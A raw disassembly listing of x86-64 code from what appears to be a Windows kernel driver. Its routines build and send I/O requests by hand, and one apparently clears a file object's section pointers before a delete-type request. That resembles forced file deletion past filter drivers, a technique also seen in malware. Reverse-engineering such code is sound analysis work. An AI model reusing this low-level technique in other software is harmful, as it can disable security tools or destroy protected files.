   140001e31:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   140001e35:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140001e39:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001e40:	00 
   140001e41:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140001e46:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   140001e4a:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001e4e:	0f 11 45 2f          	movups %xmm0,0x2f(%rbp)
   140001e52:	c7 45 ef 30 00 00 00 	movl   $0x30,-0x11(%rbp)
   140001e59:	c7 45 07 40 02 00 00 	movl   $0x240,0x7(%rbp)
   140001e60:	f3 0f 7f 45 0f       	movdqu %xmm0,0xf(%rbp)
   140001e65:	ff 15 95 62 00 00    	call   *0x6295(%rip)        # 0x140008100
   140001e6b:	85 c0                	test   %eax,%eax
   140001e6d:	79 04                	jns    0x140001e73
   140001e6f:	33 c0                	xor    %eax,%eax
   140001e71:	eb 3a                	jmp    0x140001ead
   140001e73:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001e77:	4c 8d 45 1f          	lea    0x1f(%rbp),%r8
   140001e7b:	41 b9 28 00 00 00    	mov    $0x28,%r9d
   140001e81:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140001e88:	00 
   140001e89:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   140001e8d:	ff 15 95 62 00 00    	call   *0x6295(%rip)        # 0x140008128
   140001e93:	85 c0                	test   %eax,%eax
   140001e95:	79 0c                	jns    0x140001ea3
   140001e97:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001e9b:	ff 15 a7 62 00 00    	call   *0x62a7(%rip)        # 0x140008148
   140001ea1:	eb cc                	jmp    0x140001e6f
   140001ea3:	f6 45 3f 10          	testb  $0x10,0x3f(%rbp)
   140001ea7:	75 ee                	jne    0x140001e97
   140001ea9:	48 8b 45 d7          	mov    -0x29(%rbp),%rax
   140001ead:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140001eb1:	48 33 cc             	xor    %rsp,%rcx
   140001eb4:	e8 77 51 00 00       	call   0x140007030
   140001eb9:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   140001ec0:	5d                   	pop    %rbp
   140001ec1:	c3                   	ret
   140001ec2:	cc                   	int3
   140001ec3:	cc                   	int3
   140001ec4:	40 55                	rex push %rbp
   140001ec6:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001ecb:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   140001ed2:	48 8b 05 07 82 00 00 	mov    0x8207(%rip),%rax        # 0x14000a0e0
   140001ed9:	48 33 c4             	xor    %rsp,%rax
   140001edc:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001ee0:	48 83 65 d7 00       	andq   $0x0,-0x29(%rbp)
   140001ee5:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140001ee9:	c7 44 24 68 00 01 00 	movl   $0x100,0x68(%rsp)
   140001ef0:	00 
   140001ef1:	33 c0                	xor    %eax,%eax
   140001ef3:	48 21 44 24 60       	and    %rax,0x60(%rsp)
   140001ef8:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001efb:	21 44 24 58          	and    %eax,0x58(%rsp)
   140001eff:	21 44 24 50          	and    %eax,0x50(%rsp)
   140001f03:	48 21 44 24 48       	and    %rax,0x48(%rsp)
   140001f08:	48 21 45 f7          	and    %rax,-0x9(%rbp)
   140001f0c:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001f13:	00 
   140001f14:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140001f1b:	00 
   140001f1c:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140001f21:	4c 8d 45 ef          	lea    -0x11(%rbp),%r8
   140001f25:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   140001f29:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140001f2d:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001f34:	00 
   140001f35:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140001f3a:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   140001f3e:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001f42:	0f 11 45 2f          	movups %xmm0,0x2f(%rbp)
   140001f46:	c7 45 ef 30 00 00 00 	movl   $0x30,-0x11(%rbp)
   140001f4d:	c7 45 07 40 02 00 00 	movl   $0x240,0x7(%rbp)
   140001f54:	f3 0f 7f 45 0f       	movdqu %xmm0,0xf(%rbp)
   140001f59:	ff 15 a1 61 00 00    	call   *0x61a1(%rip)        # 0x140008100
   140001f5f:	85 c0                	test   %eax,%eax
   140001f61:	79 04                	jns    0x140001f67
   140001f63:	33 c0                	xor    %eax,%eax
   140001f65:	eb 3a                	jmp    0x140001fa1
   140001f67:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001f6b:	4c 8d 45 1f          	lea    0x1f(%rbp),%r8
   140001f6f:	41 b9 28 00 00 00    	mov    $0x28,%r9d
   140001f75:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140001f7c:	00 
   140001f7d:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   140001f81:	ff 15 a1 61 00 00    	call   *0x61a1(%rip)        # 0x140008128
   140001f87:	85 c0                	test   %eax,%eax
   140001f89:	79 0c                	jns    0x140001f97
   140001f8b:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001f8f:	ff 15 b3 61 00 00    	call   *0x61b3(%rip)        # 0x140008148
   140001f95:	eb cc                	jmp    0x140001f63
   140001f97:	f6 45 3f 10          	testb  $0x10,0x3f(%rbp)
   140001f9b:	75 ee                	jne    0x140001f8b
   140001f9d:	48 8b 45 d7          	mov    -0x29(%rbp),%rax
   140001fa1:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140001fa5:	48 33 cc             	xor    %rsp,%rcx
   140001fa8:	e8 83 50 00 00       	call   0x140007030
   140001fad:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   140001fb4:	5d                   	pop    %rbp
   140001fb5:	c3                   	ret
   140001fb6:	cc                   	int3
   140001fb7:	cc                   	int3
   140001fb8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001fbd:	56                   	push   %rsi
   140001fbe:	57                   	push   %rdi
   140001fbf:	41 56                	push   %r14
   140001fc1:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140001fc8:	48 8b 05 11 81 00 00 	mov    0x8111(%rip),%rax        # 0x14000a0e0
   140001fcf:	48 33 c4             	xor    %rsp,%rax
   140001fd2:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001fd7:	49 8b f0             	mov    %r8,%rsi
   140001fda:	4c 8b f2             	mov    %rdx,%r14
   140001fdd:	ba 80 00 10 00       	mov    $0x100080,%edx
   140001fe2:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001fe8:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
   140001fed:	e8 d2 fe ff ff       	call   0x140001ec4
   140001ff2:	48 8b f8             	mov    %rax,%rdi
   140001ff5:	48 85 c0             	test   %rax,%rax
   140001ff8:	0f 84 98 00 00 00    	je     0x140002096
   140001ffe:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140002004:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   14000200b:	00 
   14000200c:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140002011:	48 8b c8             	mov    %rax,%rcx
   140002014:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002019:	ff 15 09 61 00 00    	call   *0x6109(%rip)        # 0x140008128
   14000201f:	8b d8                	mov    %eax,%ebx
   140002021:	85 c0                	test   %eax,%eax
   140002023:	78 68                	js     0x14000208d
   140002025:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000202a:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140002030:	89 0e                	mov    %ecx,(%rsi)
   140002032:	8b d1                	mov    %ecx,%edx
   140002034:	33 c9                	xor    %ecx,%ecx
   140002036:	ff 15 d4 62 00 00    	call   *0x62d4(%rip)        # 0x140008310
   14000203c:	49 89 06             	mov    %rax,(%r14)
   14000203f:	48 85 c0             	test   %rax,%rax
   140002042:	74 49                	je     0x14000208d
   140002044:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000204a:	45 33 c9             	xor    %r9d,%r9d
   14000204d:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002053:	45 33 c0             	xor    %r8d,%r8d
   140002056:	8b 0e                	mov    (%rsi),%ecx
   140002058:	33 d2                	xor    %edx,%edx
   14000205a:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000205e:	48 8b cf             	mov    %rdi,%rcx
   140002061:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002066:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000206b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002070:	ff 15 c2 60 00 00    	call   *0x60c2(%rip)        # 0x140008138
   140002076:	8b d8                	mov    %eax,%ebx
   140002078:	85 c0                	test   %eax,%eax
   14000207a:	79 11                	jns    0x14000208d
   14000207c:	83 26 00             	andl   $0x0,(%rsi)
   14000207f:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   140002084:	49 8b 0e             	mov    (%r14),%rcx
   140002087:	ff 15 7b 62 00 00    	call   *0x627b(%rip)        # 0x140008308
   14000208d:	48 8b cf             	mov    %rdi,%rcx
   140002090:	ff 15 b2 60 00 00    	call   *0x60b2(%rip)        # 0x140008148
   140002096:	8b c3                	mov    %ebx,%eax
   140002098:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000209d:	48 33 cc             	xor    %rsp,%rcx
   1400020a0:	e8 8b 4f 00 00       	call   0x140007030
   1400020a5:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   1400020ac:	00 
   1400020ad:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400020b4:	41 5e                	pop    %r14
   1400020b6:	5f                   	pop    %rdi
   1400020b7:	5e                   	pop    %rsi
   1400020b8:	c3                   	ret
   1400020b9:	cc                   	int3
   1400020ba:	cc                   	int3
   1400020bb:	cc                   	int3
   1400020bc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400020c1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400020c6:	57                   	push   %rdi
   1400020c7:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400020ce:	48 8b 05 0b 80 00 00 	mov    0x800b(%rip),%rax        # 0x14000a0e0
   1400020d5:	48 33 c4             	xor    %rsp,%rax
   1400020d8:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400020df:	00 
   1400020e0:	48 8b d9             	mov    %rcx,%rbx
   1400020e3:	ff 15 27 60 00 00    	call   *0x6027(%rip)        # 0x140008110
   1400020e9:	b2 01                	mov    $0x1,%dl
   1400020eb:	48 8b f0             	mov    %rax,%rsi
   1400020ee:	8a 48 4c             	mov    0x4c(%rax),%cl
   1400020f1:	ff 15 f9 5f 00 00    	call   *0x5ff9(%rip)        # 0x1400080f0
   1400020f7:	48 8b f8             	mov    %rax,%rdi
   1400020fa:	48 85 c0             	test   %rax,%rax
   1400020fd:	75 13                	jne    0x140002112
   1400020ff:	48 8b cb             	mov    %rbx,%rcx
   140002102:	ff 15 18 60 00 00    	call   *0x6018(%rip)        # 0x140008120
   140002108:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   14000210d:	e9 d8 00 00 00       	jmp    0x1400021ea
   140002112:	45 33 c0             	xor    %r8d,%r8d
   140002115:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000211a:	41 8d 50 01          	lea    0x1(%r8),%edx
   14000211e:	ff 15 bc 5f 00 00    	call   *0x5fbc(%rip)        # 0x1400080e0
   140002124:	33 c0                	xor    %eax,%eax
   140002126:	48 8d 0d e3 00 00 00 	lea    0xe3(%rip),%rcx        # 0x140002210
   14000212d:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002132:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002135:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   14000213a:	c7 44 24 78 80 00 00 	movl   $0x80,0x78(%rsp)
   140002141:	00 
   140002142:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140002147:	0f 11 44 24 68       	movups %xmm0,0x68(%rsp)
   14000214c:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140002150:	48 8b d7             	mov    %rdi,%rdx
   140002153:	48 89 9f c0 00 00 00 	mov    %rbx,0xc0(%rdi)
   14000215a:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000215f:	48 89 47 50          	mov    %rax,0x50(%rdi)
   140002163:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140002168:	48 89 47 48          	mov    %rax,0x48(%rdi)
   14000216c:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   140002173:	00 00 
   140002175:	48 89 87 98 00 00 00 	mov    %rax,0x98(%rdi)
   14000217c:	48 8b 87 b8 00 00 00 	mov    0xb8(%rdi),%rax
   140002183:	c6 47 40 00          	movb   $0x0,0x40(%rdi)
   140002187:	c6 40 b8 06          	movb   $0x6,-0x48(%rax)
   14000218b:	48 89 70 e0          	mov    %rsi,-0x20(%rax)
   14000218f:	48 89 58 e8          	mov    %rbx,-0x18(%rax)
   140002193:	c7 40 c0 28 00 00 00 	movl   $0x28,-0x40(%rax)
   14000219a:	c7 40 c8 04 00 00 00 	movl   $0x4,-0x38(%rax)
   1400021a1:	48 89 58 d0          	mov    %rbx,-0x30(%rax)
   1400021a5:	48 8b 87 b8 00 00 00 	mov    0xb8(%rdi),%rax
   1400021ac:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   1400021b0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400021b5:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   1400021b9:	48 8b ce             	mov    %rsi,%rcx
   1400021bc:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   1400021c0:	ff 15 32 5f 00 00    	call   *0x5f32(%rip)        # 0x1400080f8
   1400021c6:	3d 03 01 00 00       	cmp    $0x103,%eax
   1400021cb:	75 19                	jne    0x1400021e6
   1400021cd:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400021d3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400021d8:	41 b1 01             	mov    $0x1,%r9b
   1400021db:	45 33 c0             	xor    %r8d,%r8d
   1400021de:	33 d2                	xor    %edx,%edx
   1400021e0:	ff 15 02 5f 00 00    	call   *0x5f02(%rip)        # 0x1400080e8
   1400021e6:	8b 44 24 48          	mov    0x48(%rsp),%eax
   1400021ea:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   1400021f1:	00 
   1400021f2:	48 33 cc             	xor    %rsp,%rcx
   1400021f5:	e8 36 4e 00 00       	call   0x140007030
   1400021fa:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140002201:	00 
   140002202:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140002206:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000220a:	49 8b e3             	mov    %r11,%rsp
   14000220d:	5f                   	pop    %rdi
   14000220e:	c3                   	ret
   14000220f:	cc                   	int3
   140002210:	40 53                	rex push %rbx
   140002212:	48 83 ec 20          	sub    $0x20,%rsp
   140002216:	48 8b 4a 48          	mov    0x48(%rdx),%rcx
   14000221a:	48 8b da             	mov    %rdx,%rbx
   14000221d:	8b 42 30             	mov    0x30(%rdx),%eax
   140002220:	45 33 c0             	xor    %r8d,%r8d
   140002223:	89 01                	mov    %eax,(%rcx)
   140002225:	48 8b 4a 48          	mov    0x48(%rdx),%rcx
   140002229:	48 8b 42 38          	mov    0x38(%rdx),%rax
   14000222d:	33 d2                	xor    %edx,%edx
   14000222f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002233:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140002237:	ff 15 db 60 00 00    	call   *0x60db(%rip)        # 0x140008318
   14000223d:	48 8b cb             	mov    %rbx,%rcx
   140002240:	ff 15 c2 5e 00 00    	call   *0x5ec2(%rip)        # 0x140008108
   140002246:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
   14000224b:	48 83 c4 20          	add    $0x20,%rsp
   14000224f:	5b                   	pop    %rbx
   140002250:	c3                   	ret
   140002251:	cc                   	int3
   140002252:	cc                   	int3
   140002253:	cc                   	int3
   140002254:	40 53                	rex push %rbx
   140002256:	48 83 ec 30          	sub    $0x30,%rsp
   14000225a:	4c 8b 05 ef 5e 00 00 	mov    0x5eef(%rip),%r8        # 0x140008150
   140002261:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140002266:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   14000226c:	45 33 c9             	xor    %r9d,%r9d
   14000226f:	ba 00 00 01 00       	mov    $0x10000,%edx
   140002274:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002279:	4d 8b 00             	mov    (%r8),%r8
   14000227c:	ff 15 96 5e 00 00    	call   *0x5e96(%rip)        # 0x140008118
   140002282:	85 c0                	test   %eax,%eax
   140002284:	78 19                	js     0x14000229f
   140002286:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000228b:	e8 18 00 00 00       	call   0x1400022a8
   140002290:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002295:	8b d8                	mov    %eax,%ebx
   140002297:	ff 15 83 5e 00 00    	call   *0x5e83(%rip)        # 0x140008120
   14000229d:	8b c3                	mov    %ebx,%eax
   14000229f:	48 83 c4 30          	add    $0x30,%rsp
   1400022a3:	5b                   	pop    %rbx
   1400022a4:	c3                   	ret
   1400022a5:	cc                   	int3
   1400022a6:	cc                   	int3
   1400022a7:	cc                   	int3
   1400022a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400022ad:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400022b2:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400022b7:	57                   	push   %rdi
   1400022b8:	41 56                	push   %r14
   1400022ba:	41 57                	push   %r15
   1400022bc:	48 83 ec 60          	sub    $0x60,%rsp
   1400022c0:	48 8b d9             	mov    %rcx,%rbx
   1400022c3:	33 ff                	xor    %edi,%edi
   1400022c5:	33 ed                	xor    %ebp,%ebp
   1400022c7:	45 33 f6             	xor    %r14d,%r14d
   1400022ca:	e8 ed fd ff ff       	call   0x1400020bc
   1400022cf:	48 8b cb             	mov    %rbx,%rcx
   1400022d2:	ff 15 38 5e 00 00    	call   *0x5e38(%rip)        # 0x140008110
   1400022d8:	b2 01                	mov    $0x1,%dl
   1400022da:	4c 8b f8             	mov    %rax,%r15
   1400022dd:	8a 48 4c             	mov    0x4c(%rax),%cl
   1400022e0:	ff 15 0a 5e 00 00    	call   *0x5e0a(%rip)        # 0x1400080f0
   1400022e6:	48 8b f0             	mov    %rax,%rsi
   1400022e9:	48 85 c0             	test   %rax,%rax
   1400022ec:	75 13                	jne    0x140002301
   1400022ee:	48 8b cb             	mov    %rbx,%rcx
   1400022f1:	ff 15 29 5e 00 00    	call   *0x5e29(%rip)        # 0x140008120
   1400022f7:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1400022fc:	e9 22 01 00 00       	jmp    0x140002423
   140002301:	45 33 c0             	xor    %r8d,%r8d
   140002304:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002309:	41 8d 50 01          	lea    0x1(%r8),%edx
   14000230d:	ff 15 cd 5d 00 00    	call   *0x5dcd(%rip)        # 0x1400080e0
   140002313:	c6 84 24 88 00 00 00 	movb   $0x1,0x88(%rsp)
   14000231a:	01 
   14000231b:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   140002322:	00 
   140002323:	48 89 46 18          	mov    %rax,0x18(%rsi)
   140002327:	48 8d 0d e2 fe ff ff 	lea    -0x11e(%rip),%rcx        # 0x140002210
   14000232e:	48 89 9e c0 00 00 00 	mov    %rbx,0xc0(%rsi)
   140002335:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000233a:	48 89 46 50          	mov    %rax,0x50(%rsi)
   14000233e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002343:	48 89 46 48          	mov    %rax,0x48(%rsi)
   140002347:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   14000234e:	00 00 
   140002350:	48 89 86 98 00 00 00 	mov    %rax,0x98(%rsi)
   140002357:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   14000235e:	40 88 7e 40          	mov    %dil,0x40(%rsi)
   140002362:	c6 40 b8 06          	movb   $0x6,-0x48(%rax)
   140002366:	4c 89 78 e0          	mov    %r15,-0x20(%rax)
   14000236a:	48 89 58 e8          	mov    %rbx,-0x18(%rax)
   14000236e:	c7 40 c0 01 00 00 00 	movl   $0x1,-0x40(%rax)
   140002375:	c7 40 c8 0d 00 00 00 	movl   $0xd,-0x38(%rax)
   14000237c:	48 89 58 d0          	mov    %rbx,-0x30(%rax)
   140002380:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   140002387:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   14000238b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002390:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002394:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   140002398:	48 8b 43 28          	mov    0x28(%rbx),%rax
   14000239c:	48 85 c0             	test   %rax,%rax
   14000239f:	74 2f                	je     0x1400023d0
   1400023a1:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400023a5:	48 85 c9             	test   %rcx,%rcx
   1400023a8:	74 07                	je     0x1400023b1
   1400023aa:	48 21 78 10          	and    %rdi,0x10(%rax)
   1400023ae:	4c 8b f1             	mov    %rcx,%r14
   1400023b1:	48 8b 08             	mov    (%rax),%rcx
   1400023b4:	48 85 c9             	test   %rcx,%rcx
   1400023b7:	74 06                	je     0x1400023bf
   1400023b9:	48 21 38             	and    %rdi,(%rax)
   1400023bc:	48 8b e9             	mov    %rcx,%rbp
   1400023bf:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400023c3:	48 85 c9             	test   %rcx,%rcx
   1400023c6:	74 08                	je     0x1400023d0
   1400023c8:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   1400023cd:	48 8b f9             	mov    %rcx,%rdi
   1400023d0:	48 8b d6             	mov    %rsi,%rdx
   1400023d3:	49 8b cf             	mov    %r15,%rcx
   1400023d6:	ff 15 1c 5d 00 00    	call   *0x5d1c(%rip)        # 0x1400080f8
   1400023dc:	3d 03 01 00 00       	cmp    $0x103,%eax
   1400023e1:	75 19                	jne    0x1400023fc
   1400023e3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400023e9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400023ee:	41 b1 01             	mov    $0x1,%r9b
   1400023f1:	45 33 c0             	xor    %r8d,%r8d
   1400023f4:	33 d2                	xor    %edx,%edx
   1400023f6:	ff 15 ec 5c 00 00    	call   *0x5cec(%rip)        # 0x1400080e8
   1400023fc:	48 8b 43 28          	mov    0x28(%rbx),%rax
   140002400:	48 85 c0             	test   %rax,%rax
   140002403:	74 1a                	je     0x14000241f
   140002405:	4d 85 f6             	test   %r14,%r14
   140002408:	74 04                	je     0x14000240e
   14000240a:	4c 89 70 10          	mov    %r14,0x10(%rax)
   14000240e:	48 85 ed             	test   %rbp,%rbp
   140002411:	74 03                	je     0x140002416
   140002413:	48 89 28             	mov    %rbp,(%rax)
   140002416:	48 85 ff             	test   %rdi,%rdi
   140002419:	74 04                	je     0x14000241f
   14000241b:	48 89 78 08          	mov    %rdi,0x8(%rax)
   14000241f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140002423:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140002428:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000242c:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140002430:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140002434:	49 8b e3             	mov    %r11,%rsp
   140002437:	41 5f                	pop    %r15
   140002439:	41 5e                	pop    %r14
   14000243b:	5f                   	pop    %rdi
   14000243c:	c3                   	ret
   14000243d:	cc                   	int3
   14000243e:	cc                   	int3
   14000243f:	cc                   	int3
   140002440:	4c 8b dc             	mov    %rsp,%r11
   140002443:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   140002447:	55                   	push   %rbp
   140002448:	56                   	push   %rsi
   140002449:	57                   	push   %rdi
   14000244a:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140002451:	4c 8b c9             	mov    %rcx,%r9
   140002454:	41 8b f0             	mov    %r8d,%esi
   140002457:	33 c0                	xor    %eax,%eax
   140002459:	49 8d 7b b8          	lea    -0x48(%r11),%rdi
   14000245d:	33 db                	xor    %ebx,%ebx
   14000245f:	41 89 43 0c          	mov    %eax,0xc(%r11)
   140002463:	48 8b ea             	mov    %rdx,%rbp
   140002466:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000246b:	8d 4b 30             	lea    0x30(%rbx),%ecx
   14000246e:	f3 aa                	rep stos %al,(%rdi)
   140002470:	49 8b c9             	mov    %r9,%rcx
   140002473:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   140002477:	e8 54 f9 ff ff       	call   0x140001dd0
   14000247c:	48 8b f8             	mov    %rax,%rdi
   14000247f:	48 85 c0             	test   %rax,%rax
   140002482:	74 77                	je     0x1400024fb
   140002484:	44 8d 4b 08          	lea    0x8(%rbx),%r9d
   140002488:	48 89 b4 24 b0 00 00 	mov    %rsi,0xb0(%rsp)
   14000248f:	00 
   140002490:	4c 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%r8
   140002497:	00 
   140002498:	c7 44 24 20 14 00 00 	movl   $0x14,0x20(%rsp)
   14000249f:	00 
   1400024a0:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400024a5:	48 8b c8             	mov    %rax,%rcx
   1400024a8:	ff 15 82 5c 00 00    	call   *0x5c82(%rip)        # 0x140008130
   1400024ae:	85 c0                	test   %eax,%eax
   1400024b0:	75 49                	jne    0x1400024fb
   1400024b2:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400024b7:	48 8d 84 24 c8 00 00 	lea    0xc8(%rsp),%rax
   1400024be:	00 
   1400024bf:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400024c4:	45 33 c9             	xor    %r9d,%r9d
   1400024c7:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1400024cb:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400024d0:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400024d5:	45 33 c0             	xor    %r8d,%r8d
   1400024d8:	33 d2                	xor    %edx,%edx
   1400024da:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400024df:	48 8b cf             	mov    %rdi,%rcx
   1400024e2:	48 89 9c 24 c8 00 00 	mov    %rbx,0xc8(%rsp)
   1400024e9:	00 
   1400024ea:	ff 15 50 5c 00 00    	call   *0x5c50(%rip)        # 0x140008140
   1400024f0:	48 8b cf             	mov    %rdi,%rcx
   1400024f3:	8b d8                	mov    %eax,%ebx
   1400024f5:	ff 15 4d 5c 00 00    	call   *0x5c4d(%rip)        # 0x140008148
   1400024fb:	8b c3                	mov    %ebx,%eax
   1400024fd:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140002504:	00 
   140002505:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   14000250c:	5f                   	pop    %rdi
   14000250d:	5e                   	pop    %rsi
   14000250e:	5d                   	pop    %rbp
   14000250f:	c3                   	ret
   140002510:	48 83 ec 28          	sub    $0x28,%rsp
   140002514:	80 3d 75 bc 00 00 00 	cmpb   $0x0,0xbc75(%rip)        # 0x14000e190
   14000251b:	74 0c                	je     0x140002529
   14000251d:	e8 e2 0b 00 00       	call   0x140003104
   140002522:	c6 05 67 bc 00 00 00 	movb   $0x0,0xbc67(%rip)        # 0x14000e190
   140002529:	48 83 c4 28          	add    $0x28,%rsp
   14000252d:	c3                   	ret
   14000252e:	cc                   	int3
   14000252f:	cc                   	int3
   140002530:	45 33 c0             	xor    %r8d,%r8d
   140002533:	4c 8d 4a fc          	lea    -0x4(%rdx),%r9
   140002537:	4d 85 c9             	test   %r9,%r9
   14000253a:	74 29                	je     0x140002565
   14000253c:	48 8d 51 02          	lea    0x2(%rcx),%rdx
   140002540:	80 7a fe 0d          	cmpb   $0xd,-0x2(%rdx)
   140002544:	75 11                	jne    0x140002557
   140002546:	80 7a ff 0a          	cmpb   $0xa,-0x1(%rdx)
   14000254a:	75 0b                	jne    0x140002557
   14000254c:	80 3a 0d             	cmpb   $0xd,(%rdx)
   14000254f:	75 06                	jne    0x140002557
   140002551:	80 7a 01 0a          	cmpb   $0xa,0x1(%rdx)
   140002555:	74 12                	je     0x140002569
   140002557:	41 ff c0             	inc    %r8d
   14000255a:	48 ff c2             	inc    %rdx
   14000255d:	49 63 c0             	movslq %r8d,%rax
   140002560:	49 3b c1             	cmp    %r9,%rax
   140002563:	72 db                	jb     0x140002540
   140002565:	48 8b c1             	mov    %rcx,%rax
   140002568:	c3                   	ret
